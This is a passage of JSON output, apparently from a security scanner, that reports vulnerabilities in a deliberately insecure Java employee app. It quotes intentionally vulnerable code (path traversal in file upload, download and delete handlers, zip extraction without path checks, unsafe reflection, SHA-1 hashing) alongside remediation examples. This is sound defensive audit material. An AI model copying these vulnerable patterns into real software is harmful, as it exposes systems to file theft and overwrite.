validation"}]}, "mitigations": {"mitigation": [{"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}, {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "N/A"}]}}}}, "Spring Security Misconfiguration: Lack of Fallback Check": {"language": "JAVA", "files": [{"file": "WebContent/WEB-INF/spring-security-servlet.xml", "items": [{"id": "IN00478", "function": "null()", "line": "44", "snippet": "</security:global-method-security> -->\n    \n    <security:http auto-config=\"true\" disable-url-rewriting=\"true\" use-expressions=\"true\" create-session=\"ifRequired\">\n    \t<security:csrf/>"}]}], "remediation": null}, "Unsafe Reflection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00480", "function": "java.lang.Class.forName()", "line": "1021", "snippet": "try {\n\t\tString ctl = request.getParameter(\"className\");\n\t    Class cmdClass = Class.forName(\"com.accenture.sec.dao.\"+ctl);\n\t    EmployeeDAO emp = (EmployeeDAO) cmdClass.newInstance();\n\t\tMap<Integer, String> departmentMap = emp.getDepartmentMap();"}]}], "remediation": {"remediation": {"@id": "R.0085", "@name": "Unsafe Reflection", "@dateLastModified": "3/8/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "public ModelAndView listDetail(HttpServletRequest request) throws Exception {\n\t\tModelAndView mv = new ModelAndView();\n\t\t\n\t\tString cls = request.getParameter(&quot;className&quot;);\n\t   <em class=\"red\"> Class cmdClass = Class.forName(&quot;com.accenture.sec.dao.&quot;+cls);</em>\n\t    EmployeeDAO emp = (EmployeeDAO) cmdClass.newInstance();\n\t    emp.getDepartmentMap();\n\t...\t\n\t\treturn mv;\n\t}", "nonvulncode": "public ModelAndView listDetail(HttpServletRequest request) throws Exception {\n\t\tModelAndView mv = new ModelAndView();\n\t\t\n\t\tString cls = request.getParameter(&quot;className&quot;);\n<em class=\"blue\">Map&lt;String,String&gt; classMap= getListOfClass();\nString className = classMap.get(cls);\n\t    Class cmdClass = Class.forName(className);</em>\n\t    EmployeeDAO emp = (EmployeeDAO) cmdClass.newInstance();\n\t    emp.getDepartmentMap();\n\t\t....\n\t\treturn mv;\n\t}", "comments": "Instead of using the user data directly as classname, have predefined map of classnames, and fetch the classname respective to user data from the map.", "impact": "Maintain white list of class names", "abstract": "Use of predefined dataset of class names"}, {"@type": "JAVA/JSP", "vulncode": "EmployeeController.j<em class=\"bold\">ava</em>\npublic ModelAndView listDetail(HttpServletRequest request) throws Exception {\n\t\tModelAndView mv = new ModelAndView();\n\t\t\n\t\tString cls = request.getParameter(&quot;className&quot;);\n\t   <em class=\"red\"> Class cmdClass = Class.forName(&quot;com.accenture.sec.dao.&quot;+cls);</em>\n\t    EmployeeDAO emp = (EmployeeDAO) cmdClass.newInstance();\n\t    emp.getDepartmentMap();\n\t\t....\n\t\treturn mv;\n\t}", "nonvulncode": "EmployeeController.j<em class=\"bold\">ava</em>\npublic ModelAndView <em class=\"blue\">listAdminEmployeeDetail</em>(HttpServletRequest request) throws Exception {\n\t\tModelAndView mv = new ModelAndView();\n\t\t\n\t    <em class=\"blue\">AdminEmployeeDAO adminEmp = new AdminEmployeeDAO();</em>\n\t    adminEmp.getDepartmentMap();\n\t...\t\n\t\treturn mv;\n\t}\n\npublic ModelAndView<em class=\"blue\"> listSalesEmployeeDetail</em>(HttpServletRequest request) throws Exception {\n\t\tModelAndView mv = new ModelAndView();\n\t\t\n\t   <em class=\"blue\"> SalesEmployeeDAO salesEmp = new SalesEmployeeDAO();</em>\n\t    salesEmp.getDepartmentMap();\n\t...\t\n\t\treturn mv;\n\t}", "comments": "Instead of using generic method, functional design can be made in such a way, specific call/method can be defined to avoid use of reflection with user data.", "impact": "Code maintenance, necessary changes to be implemented in all method calls.", "abstract": "Use of separate method and specific instance creation"}, {"@type": ".NET/C#/ASP", "vulncode": "public ActionResult UnsafeReflection(string txtMethod)\n        {\n            Assembly assembly = Assembly.LoadFile(AppDomain.CurrentDomain.BaseDirectory.ToString() +  &quot;\\\\bin\\\\VulnerableApp.dll&quot;);\n            var classType = assembly.GetType(&quot;VulnerableApp.Controllers.DownloadController &quot;);\n\n            object downloadInstance = Activator.CreateInstance(classType);\n            var myMethod = classType.GetMethod(<em class=\"red\">txtMethod</em>);\n\n            myMethod.Invoke(downloadInstance, null);\n            return View();\n        }", "nonvulncode": "[HttpPost]\n        public ActionResult UnsafeReflection()\n        {\n          \n           <em class=\"blue\"> DownloadController download = new DownloadController();\n            download.Download();</em>\n\n            return View();\n\n        }", "comments": "With the vulnerable code, attacker can invoke any method within the specific class of the assembly. Instead of using generic method, functional design can be made in such a way, specific call/method can be defined to avoid use of reflection with user data.", "impact": "Code maintenance, necessary changes to be implemented in all method calls.", "abstract": "Use of separate method and specific instance creation"}, {"@type": ".NET/C#/ASP", "vulncode": "public ActionResult UnsafeReflection(string txtMethod)\n        {\n            Assembly assembly = Assembly.LoadFile(AppDomain.CurrentDomain.BaseDirectory.ToString() +  &quot;\\\\bin\\\\VulnerableApp.dll&quot;);\n            var classType = assembly.GetType(&quot;VulnerableApp.Controllers.DownloadController &quot;);\n\n            object downloadInstance = Activator.CreateInstance(classType);\n            var myMethod = classType.GetMethod(<em class=\"red\">txtMethod</em>);\n\n            myMethod.Invoke(downloadInstance, null);\n            return View();\n        }", "nonvulncode": "public ActionResult UnsafeReflection(string txtMethod)\n        {\n            string[] methods = {&quot;Method1&quot;, &quot;Method2&quot;, &quot;Method3&quot;};\n            if<em class=\"blue\">(Array.Exists(methods, element =&gt; element == txtMethod</em>))\n            {\n                 Assembly assembly = Assembly.LoadFile(AppDomain.CurrentDomain.BaseDirectory.ToString() +  &quot;\\\\bin\\\\VulnerableApp.dll&quot;);\n            var classType = assembly.GetType(&quot;VulnerableApp.Controllers.DownloadController &quot;);\n\n                object downloadInstance = Activator.CreateInstance(classType);\n\n                var myMethod = classType.GetMethod(txtMethod);\n\n                myMethod.Invoke(downloadInstance, null);\n            }\n            else\n            {\n                throw new InvalidOperationException(&quot;Logfile cannot be read-only&quot;);\n            }\n            return View();\n        }", "comments": "If you allowed user to specify a method to execute. Make a list of methods that user are allowed to execute.", "impact": "Maintain white list of method names", "abstract": "Use of predefined dataset of of method name"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Weak Cryptographic Hash": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00481", "function": "getInstance()", "line": "575", "snippet": "sr.nextBytes(salt);\n\t        \t        \n\t        MessageDigest md = MessageDigest.getInstance(\"SHA-1\");\n            md.update(pwd.getBytes());\n            byte[] bytes = md.digest();"}]}], "remediation": null}}, "failed": {"Path Manipulation": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00138", "function": "java.nio.file.Path.toFile()", "line": "850", "snippet": "Path path = Paths.get(filepath, fileName).normalize();\n\t\t\tFile file = path.toFile();\n\n\t\t\tremediatedFile(filepath);", "originalCode": ["        @RequestMapping(value=\"deleteFile.html\", method={RequestMethod.POST})", "        public ModelAndView deleteFile( @RequestParam(value=\"fileName\")String fileName) {", "", "                ModelAndView mv = new ModelAndView();", "                //String filepath = \"C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles\\\\\";", "                String filepath= System.getProperty(\"catalina.home\")+File.separator+\"tmpFiles\"+File.separator;", "                List<String> allowedFilePaths = new ArrayList<String>();", "                String app_base_path =\"C:\\\\projects\\\\appsec\\\\\";", "", "                try {", "                        allowedFilePaths.add(app_base_path+\"sales\");", "                        allowedFilePaths.add(app_base_path+\"reports\");", "", "                         boolean filePathNotValid = Pattern.matches(\"^(.+)?(\\\\\\\\[.]+\\\\\\\\)(.+)?$\", fileName); //returns true if the file path contains any number of \\...\\", "", "                         if(filePathNotValid) {", "                                 throw new Exception(\"User provided file path is not valid, contains malicious path traversal\");", "                         } else {", "                                 for(String allowedPath : allowedFilePaths) {", "                                         if(filepath.startsWith(allowedPath)) {", "                                                 System.out.println(\"Continue application logic here\");", "                                         }", "                                 }", "                         }", "", "                        Path path = Paths.get(filepath, fileName).normalize();", "                        File file = path.toFile();", "", "                        remediatedFile(filepath);", "                        boolean isfileNameValid = file.getCanonicalFile().getName().equals(fileName);", "", "                        if (isfileNameValid) {", "                                file.delete();", "                                System.out.println(\"File deleted successfully\");", "                                //mv = executeCommand(\"dir\");", "                                mv.setViewName(\"commandExec\");", "                                mv.addObject(\"msg\", \"File deleted successfully.\");", "                        } else {", "                                System.out.println(\"Failed to delete the file\");", "                                mv.setViewName(\"commandExec\");", "                                mv.addObject(\"msg\", \"Failed to delete the file\");", "                        }", "                } catch (Exception e) {", "                        logger.error(\"Error in deleting file\", e.getMessage());", "                        System.exit(99);", "                }", "", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00142", "function": "java.io.File.File()", "line": "441", "snippet": "prop.setProperty(\"sec_password_encrypted\", encryptedText);\n\t\t\t\n\t\t\tFile file = new File(fileName);\n\t\t\tFileOutputStream fileOut = new FileOutputStream(file);\n\t\t\tprop.store(fileOut, \"writing encrypted password\");", "originalCode": ["        @RequestMapping(value=\"downloadPropFile.html\", method=RequestMethod.POST)", "        public ModelAndView downloadPropertyFile(HttpServletRequest request, HttpServletResponse response) throws Exception {", "        ModelAndView mv = new ModelAndView();", "", "                /*", "                 * java.util.logging.Logger logger2 = (java.util.logging.Logger)", "                 * LoggerFactory.getLogger(EmployeeController.class);", "                 * logger2.setLevel(Level.parse(\"com.domain.application.debugLevel\"));", "                 */", "", "", "                try (InputStream input = LoginDAO.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {", "", "                        Properties prop = new Properties();", "                        prop.load(input);", "", "                        String dbpwd = prop.getProperty(\"sec_password\");", "                        String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";", "                        this.fileName = request.getParameter(\"name\")!=null? request.getParameter(\"name\") : filePath + \"sec_conn_encrypted.properties\";", "", "                        String encryptedText = encryptWithSHA(dbpwd);", "                        logger.debug(\"Encrypted password---\",encryptedText);", "                        //logger2.log(Level.parse(\"com.domain.application.debugLevel\"), \"Test logger\");", "                        //logger2.log(Level.parse(request.getParameter(\"loglevel\")), \"Test logger\");", "                        prop.setProperty(\"sec_password_encrypted\", encryptedText);", "", "                        File file = new File(fileName);", "                        FileOutputStream fileOut = new FileOutputStream(file);", "                        prop.store(fileOut, \"writing encrypted password\");", "", "                mv.addObject(\"msg\", \"Encrypted file downloaded\");", "                mv.setViewName(\"uploadFile\");", "            } catch (Exception e){", "                logger.error(\"error in downloading property file\", e);", "                        mv.setViewName(\"failure\");", "                mv.addObject(\"msg\", \"Error in downloading property file, check log for more information\");", "                e.printStackTrace();", "            }", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00153", "function": "java.io.File.File()", "line": "359", "snippet": "String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";\n\t        this.fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        //JarFile jf = new JarFile(fileToDownload); //Improper Verification of Cryptographic Signature", "originalCode": ["        @RequestMapping(value=\"download.html\", method=RequestMethod.GET)", "        public ModelAndView downloadFile( @RequestParam(value=\"file\")String name,HttpSession session,HttpServletResponse response) throws Exception {", "        ModelAndView mv = new ModelAndView();", "", "                try {", "                String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";", "                this.fileName = filePath + name;", "                File fileToDownload = new File(fileName);", "                //JarFile jf = new JarFile(fileToDownload); //Improper Verification of Cryptographic Signature", "", "             // create instance of Random class", "                SecureRandom strongRNG = SecureRandom.getInstanceStrong();", "                SecureRandom rand = new SecureRandom();", "                rand.setSeed(System.currentTimeMillis());", "                Integer seed = Integer.valueOf(rand.nextInt(Integer.MAX_VALUE));", "", "                Random r = new Random();", "                r.setSeed(12345);", "                int i = r.nextInt();", "                byte[] b = new byte[4];", "                r.nextBytes(b);", "                String identifier = seed.toString()+\"USER\";", "", "                        /*", "                         * File tf = File.createTempFile(\"Axis\", \".tmp\",new", "                         * File(System.getProperty(\"java.io.tmpdir\"))); File dir = tf.getParentFile();", "                         * if (tf.exists()) { tf.delete(); } if (dir != null) { dir.getCanonicalPath();", "                         * }", "                         */", "                // Generate random integers in range 0 to 999", "                int rand_int = strongRNG.nextInt(10000);", "                //Random insecure_rand = new Random();", "                //int rand_int = insecure_rand.nextInt(10000);", "                //String randomFileName=\"File\"+rand_int+\".txt\";", "                String randomFileName=\"File\"+getDateTimeStamp()+\"_\"+rand_int+\".txt\";", "", "                InputStream inputStream = new FileInputStream(fileToDownload);", "                response.setContentType(\"application/force-download\");", "                response.setHeader(\"Content-Disposition\", \"attachment; filename=\\\\\"+randomFileName+\"\\\";\");", "                IOUtils.copy(inputStream, response.getOutputStream());", "                response.flushBuffer();", "", "                //unchecked return value", "                int bytesToRead = 1024;", "            byte[] byteArray = new byte[bytesToRead];", "            inputStream.read(byteArray);", "            IOUtils.write(byteArray, response.getOutputStream());", "", "            inputStream.close();", "", "                mv.addObject(\"msg\", \"File downloaded\");", "                mv.setViewName(\"uploadFile\");", "", "            } catch (Exception e){", "                logger.error(\"error in download\", e);", "                        mv.setViewName(\"failure\");", "                mv.addObject(\"msg\", \"Error in downloading file, check log for more information\");", "                e.printStackTrace();", "            }", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00154", "function": "java.io.File.File()", "line": "251", "snippet": "// Create the file on server\n\t\t\t\t\tFile serverFile = new File(dir.getAbsolutePath()+ File.separator + name);\n\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t//if (serverFile.getCanonicalFile().getName().equals(name)) {", "originalCode": ["        @RequestMapping(value=\"fileupload.html\", method=RequestMethod.POST)", "        public ModelAndView processUpload(@RequestParam(\"file\") MultipartFile file) throws IOException,MultipartException {", "                // process your file", "                logger.debug(\"Entering the upload process\");", "", "                ModelAndView mv= new ModelAndView();", "", "                if (!file.isEmpty()) {", "                        String name = file.getOriginalFilename();", "                        String extension = FilenameUtils.getExtension(file.getOriginalFilename());", "                        System.out.println(\"extension\"+extension);", "                        String rootPath = System.getProperty(\"catalina.home\");", "", "                        if (\"txt\".equals(extension)) {", "                                try {", "                                        byte[] bytes = file.getBytes();", "", "                                        // Creating the directory to store file", "                                        File dir = new File(rootPath + File.separator + \"tmpFiles\");", "                                        if (!dir.exists())", "                                                dir.mkdirs();", "", "                                        // Create the file on server", "                                        File serverFile = new File(dir.getAbsolutePath()+ File.separator + name);", "", "                                        //if (serverFile.getCanonicalFile().getName().equals(name)) {", "                                                //serverFile.setWritable(false);", "                                                // This restricts user from overriding the file with same filenam", "                                                /*", "                                                 * serverFile.setExecutable(false, true);", "                                                 * serverFile.setReadable(false, true);", "                                                 * serverFile.setWritable(false, true);", "                                                 */", "", "                                                BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(serverFile));", "                                                stream.write(bytes);", "                                                stream.close();", "", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\", \"You successfully uploaded file=\" + name);", "                                        /*} else {", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\",\"You failed to upload file, since the file name tried to manipulate path\");", "                                        }*/", "", "                                        return mv;", "                                } catch (Exception e) {", "                                        mv.setViewName(\"uploadFile\");", "                                        mv.addObject(\"msg\", \"You failed to upload \" + name + \" => \");", "                                        return mv;", "                                }", "                        } else if (\"zip\".equals(extension)) {", "                                String destDirectory = rootPath + File.separator + \"tmpFiles\";", "                                File destDir = new File(destDirectory);", "                        if (!destDir.exists()) {", "                            destDir.mkdir();", "                        }", "                        ZipInputStream zipIn = new ZipInputStream(file.getInputStream());", "                        ZipEntry entry = zipIn.getNextEntry();", "                        // iterates over entries in the zip file", "                        while (entry != null && !entry.isDirectory()) {", "                            String filePath = destDirectory + File.separator + entry.getName();", "                            //checks if the zip entry file is overriden -- Vul 209", "                            //checkZipEntryOverwrite(destDir,entry);", "", "                            if (!entry.getName().contains(\"/\")) {", "                                // if the entry is a file, extracts it directly", "                                filePath = Encode.forHtmlAttribute(filePath);", "                                extractFile(zipIn, filePath);", "                            } else {", "                                // if the entry is a directory, make the directory", "                                int index= filePath.lastIndexOf(\"/\");", "                                String dirPath = filePath.substring(0, index);", "                                File dir = new File(dirPath);", "                                if(!dir.exists()) {", "                                        if(dir.mkdir()) {", "                                                System.out.println(\"Directory created\");", "                                        }", "                                }", "                                extractFile(zipIn, filePath);", "                            }", "                            zipIn.closeEntry();", "                            entry = zipIn.getNextEntry();", "                        }", "                        zipIn.close();", "", "                        mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\",\"You successfully uploaded file=\" + name);", "                    } else {", "                                mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\", \"Only text files can be uploaded\");", "                                return mv;", "                        }", "", "                } else {", "                        mv.setViewName(\"uploadFile\");", "                        mv.addObject(\"msg\", \"You failed to upload because the file was empty.\");", "                        return mv;", "                }", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00156", "function": "java.nio.file.Paths.get()", "line": "849", "snippet": "}\n\t\t\t\n\t\t\tPath path = Paths.get(filepath, fileName).normalize();\n\t\t\tFile file = path.toFile();", "originalCode": ["        @RequestMapping(value=\"deleteFile.html\", method={RequestMethod.POST})", "        public ModelAndView deleteFile( @RequestParam(value=\"fileName\")String fileName) {", "", "                ModelAndView mv = new ModelAndView();", "                //String filepath = \"C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles\\\\\";", "                String filepath= System.getProperty(\"catalina.home\")+File.separator+\"tmpFiles\"+File.separator;", "                List<String> allowedFilePaths = new ArrayList<String>();", "                String app_base_path =\"C:\\\\projects\\\\appsec\\\\\";", "", "                try {", "                        allowedFilePaths.add(app_base_path+\"sales\");", "                        allowedFilePaths.add(app_base_path+\"reports\");", "", "                         boolean filePathNotValid = Pattern.matches(\"^(.+)?(\\\\\\\\[.]+\\\\\\\\)(.+)?$\", fileName); //returns true if the file path contains any number of \\...\\", "", "                         if(filePathNotValid) {", "                                 throw new Exception(\"User provided file path is not valid, contains malicious path traversal\");", "                         } else {", "                                 for(String allowedPath : allowedFilePaths) {", "                                         if(filepath.startsWith(allowedPath)) {", "                                                 System.out.println(\"Continue application logic here\");", "                                         }", "                                 }", "                         }", "", "                        Path path = Paths.get(filepath, fileName).normalize();", "                        File file = path.toFile();", "", "                        remediatedFile(filepath);", "                        boolean isfileNameValid = file.getCanonicalFile().getName().equals(fileName);", "", "                        if (isfileNameValid) {", "                                file.delete();", "                                System.out.println(\"File deleted successfully\");", "                                //mv = executeCommand(\"dir\");", "                                mv.setViewName(\"commandExec\");", "                                mv.addObject(\"msg\", \"File deleted successfully.\");", "                        } else {", "                                System.out.println(\"Failed to delete the file\");", "                                mv.setViewName(\"commandExec\");", "                                mv.addObject(\"msg\", \"Failed to delete the file\");", "                        }", "                } catch (Exception e) {", "                        logger.error(\"Error in deleting file\", e.getMessage());", "                        System.exit(99);", "                }", "", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00137", "function": "java.nio.file.Paths.get()", "line": "849", "snippet": "}\n\t\t\t\n\t\t\tPath path = Paths.get(filepath, fileName).normalize();\n\t\t\tFile file = path.toFile();", "originalCode": ["        @RequestMapping(value=\"deleteFile.html\", method={RequestMethod.POST})", "        public ModelAndView deleteFile( @RequestParam(value=\"fileName\")String fileName) {", "", "                ModelAndView mv = new ModelAndView();", "                //String filepath = \"C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles\\\\\";", "                String filepath= System.getProperty(\"catalina.home\")+File.separator+\"tmpFiles\"+File.separator;", "                List<String> allowedFilePaths = new ArrayList<String>();", "                String app_base_path =\"C:\\\\projects\\\\appsec\\\\\";", "", "                try {", "                        allowedFilePaths.add(app_base_path+\"sales\");", "                        allowedFilePaths.add(app_base_path+\"reports\");", "", "                         boolean filePathNotValid = Pattern.matches(\"^(.+)?(\\\\\\\\[.]+\\\\\\\\)(.+)?$\", fileName); //returns true if the file path contains any number of \\...\\", "", "                         if(filePathNotValid) {", "                                 throw new Exception(\"User provided file path is not valid, contains malicious path traversal\");", "                         } else {", "                                 for(String allowedPath : allowedFilePaths) {", "                                         if(filepath.startsWith(allowedPath)) {", "                                                 System.out.println(\"Continue application logic here\");", "                                         }", "                                 }", "                         }", "", "                        Path path = Paths.get(filepath, fileName).normalize();", "                        File file = path.toFile();", "", "                        remediatedFile(filepath);", "                        boolean isfileNameValid = file.getCanonicalFile().getName().equals(fileName);", "", "                        if (isfileNameValid) {", "                                file.delete();", "                                System.out.println(\"File deleted successfully\");", "                                //mv = executeCommand(\"dir\");", "                                mv.setViewName(\"commandExec\");", "                                mv.addObject(\"msg\", \"File deleted successfully.\");", "                        } else {", "                                System.out.println(\"Failed to delete the file\");", "                                mv.setViewName(\"commandExec\");", "                                mv.addObject(\"msg\", \"Failed to delete the file\");", "                        }", "                } catch (Exception e) {", "                        logger.error(\"Error in deleting file\", e.getMessage());", "                        System.exit(99);", "                }", "", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00139", "function": "java.nio.file.Path.toFile()", "line": "850", "snippet": "Path path = Paths.get(filepath, fileName).normalize();\n\t\t\tFile file = path.toFile();\n\n\t\t\tremediatedFile(filepath);", "originalCode": ["        @RequestMapping(value=\"deleteFile.html\", method={RequestMethod.POST})", "        public ModelAndView deleteFile( @RequestParam(value=\"fileName\")String fileName) {", "", "                ModelAndView mv = new ModelAndView();", "                //String filepath = \"C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles\\\\\";", "                String filepath= System.getProperty(\"catalina.home\")+File.separator+\"tmpFiles\"+File.separator;", "                List<String> allowedFilePaths = new ArrayList<String>();", "                String app_base_path =\"C:\\\\projects\\\\appsec\\\\\";", "", "                try {", "                        allowedFilePaths.add(app_base_path+\"sales\");", "                        allowedFilePaths.add(app_base_path+\"reports\");", "", "                         boolean filePathNotValid = Pattern.matches(\"^(.+)?(\\\\\\\\[.]+\\\\\\\\)(.+)?$\", fileName); //returns true if the file path contains any number of \\...\\", "", "                         if(filePathNotValid) {", "                                 throw new Exception(\"User provided file path is not valid, contains malicious path traversal\");", "                         } else {", "                                 for(String allowedPath : allowedFilePaths) {", "                                         if(filepath.startsWith(allowedPath)) {", "                                                 System.out.println(\"Continue application logic here\");", "                                         }", "                                 }", "                         }", "", "                        Path path = Paths.get(filepath, fileName).normalize();", "                        File file = path.toFile();", "", "                        remediatedFile(filepath);", "                        boolean isfileNameValid = file.getCanonicalFile().getName().equals(fileName);", "", "                        if (isfileNameValid) {", "                                file.delete();", "                                System.out.println(\"File deleted successfully\");", "                                //mv = executeCommand(\"dir\");", "                                mv.setViewName(\"commandExec\");", "                                mv.addObject(\"msg\", \"File deleted successfully.\");", "                        } else {", "                                System.out.println(\"Failed to delete the file\");", "                                mv.setViewName(\"commandExec\");", "                                mv.addObject(\"msg\", \"Failed to delete the file\");", "                        }", "                } catch (Exception e) {", "                        logger.error(\"Error in deleting file\", e.getMessage());", "                        System.exit(99);", "                }", "", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00140", "function": "java.io.FileOutputStream.FileOutputStream()", "line": "331", "snippet": "private void extractFile(ZipInputStream zipIn, String filePath) throws IOException {\n        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filePath));\n        byte[] bytesIn = new byte[BUFFER_SIZE];\n        int read = 0;", "originalCode": ["        private void extractFile(ZipInputStream zipIn, String filePath) throws IOException {", "        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filePath));", "        byte[] bytesIn = new byte[BUFFER_SIZE];", "        int read = 0;", "        while ((read = zipIn.read(bytesIn)) != -1) {", "            bos.write(bytesIn, 0, read);", "        }", "        bos.close();", "    }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00141", "function": "java.io.FileOutputStream.FileOutputStream()", "line": "331", "snippet": "private void extractFile(ZipInputStream zipIn, String filePath) throws IOException {\n        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filePath));\n        byte[] bytesIn = new byte[BUFFER_SIZE];\n        int read = 0;", "originalCode": ["        private void extractFile(ZipInputStream zipIn, String filePath) throws IOException {", "        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filePath));", "        byte[] bytesIn = new byte[BUFFER_SIZE];", "        int read = 0;", "        while ((read = zipIn.read(bytesIn)) != -1) {", "            bos.write(bytesIn, 0, read);", "        }", "        bos.close();", "    }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00143", "function": "java.nio.file.Path.toFile()", "line": "876", "snippet": "private boolean remediatedFile(String filePath) throws Exception {\n\t\tString originalFilePath = filePath;\n\t\tFile file = Paths.get(filePath, new String[0]).toFile();\n\t\tString remediatedFilePath = file.getCanonicalFile().toString();\n\t\tboolean isFileNameValid = remediatedFilePath.equals(originalFilePath);", "originalCode": ["        private boolean remediatedFile(String filePath) throws Exception {", "                String originalFilePath = filePath;", "                File file = Paths.get(filePath, new String[0]).toFile();", "                String remediatedFilePath = file.getCanonicalFile().toString();", "                boolean isFileNameValid = remediatedFilePath.equals(originalFilePath);", "", "                if(isFileNameValid && file.exists()) {", "                        //Application logic goes here", "                }", "                return false;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00144", "function": "java.io.File.File()", "line": "359", "snippet": "String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";\n\t        this.fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        //JarFile jf = new JarFile(fileToDownload); //Improper Verification of Cryptographic Signature", "originalCode": ["        @RequestMapping(value=\"download.html\", method=RequestMethod.GET)", "        public ModelAndView downloadFile( @RequestParam(value=\"file\")String name,HttpSession session,HttpServletResponse response) throws Exception {", "        ModelAndView mv = new ModelAndView();", "", "                try {", "                String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";", "                this.fileName = filePath + name;", "                File fileToDownload = new File(fileName);", "                //JarFile jf = new JarFile(fileToDownload); //Improper Verification of Cryptographic Signature", "", "             // create instance of Random class", "                SecureRandom strongRNG = SecureRandom.getInstanceStrong();", "                SecureRandom rand = new SecureRandom();", "                rand.setSeed(System.currentTimeMillis());", "                Integer seed = Integer.valueOf(rand.nextInt(Integer.MAX_VALUE));", "", "                Random r = new Random();", "                r.setSeed(12345);", "                int i = r.nextInt();", "                byte[] b = new byte[4];", "                r.nextBytes(b);", "                String identifier = seed.toString()+\"USER\";", "", "                        /*", "                         * File tf = File.createTempFile(\"Axis\", \".tmp\",new", "                         * File(System.getProperty(\"java.io.tmpdir\"))); File dir = tf.getParentFile();", "                         * if (tf.exists()) { tf.delete(); } if (dir != null) { dir.getCanonicalPath();", "                         * }", "                         */", "                // Generate random integers in range 0 to 999", "                int rand_int = strongRNG.nextInt(10000);", "                //Random insecure_rand = new Random();", "                //int rand_int = insecure_rand.nextInt(10000);", "                //String randomFileName=\"File\"+rand_int+\".txt\";", "                String randomFileName=\"File\"+getDateTimeStamp()+\"_\"+rand_int+\".txt\";", "", "                InputStream inputStream = new FileInputStream(fileToDownload);", "                response.setContentType(\"application/force-download\");", "                response.setHeader(\"Content-Disposition\", \"attachment; filename=\\\\\"+randomFileName+\"\\\";\");", "                IOUtils.copy(inputStream, response.getOutputStream());", "                response.flushBuffer();", "", "                //unchecked return value", "                int bytesToRead = 1024;", "            byte[] byteArray = new byte[bytesToRead];", "            inputStream.read(byteArray);", "            IOUtils.write(byteArray, response.getOutputStream());", "", "            inputStream.close();", "", "                mv.addObject(\"msg\", \"File downloaded\");", "                mv.setViewName(\"uploadFile\");", "", "            } catch (Exception e){", "                logger.error(\"error in download\", e);", "                        mv.setViewName(\"failure\");", "                mv.addObject(\"msg\", \"Error in downloading file, check log for more information\");", "                e.printStackTrace();", "            }", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00145", "function": "java.io.File.File()", "line": "343", "snippet": "String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";\n\t        String fileName = filePath + \"user_info.json\";\n\t        File jsonFile = new File(fileName);\n\t\t\t\n\t        JsonGenerator jGenerator = jfactory.createJsonGenerator(jsonFile, JsonEncoding.UTF8);", "originalCode": ["        @RequestMapping(value=\"addUserDataFromJson.html\", method= {RequestMethod.GET,RequestMethod.POST})", "        public ModelAndView saveUserData(@ModelAttribute(\"userProfile\") UserProfileForm userProfile) {", "", "                if(userProfile.getUserName()!=null) {", "                JsonFactory jfactory = new JsonFactory();", "                try {", "                        String filePath = 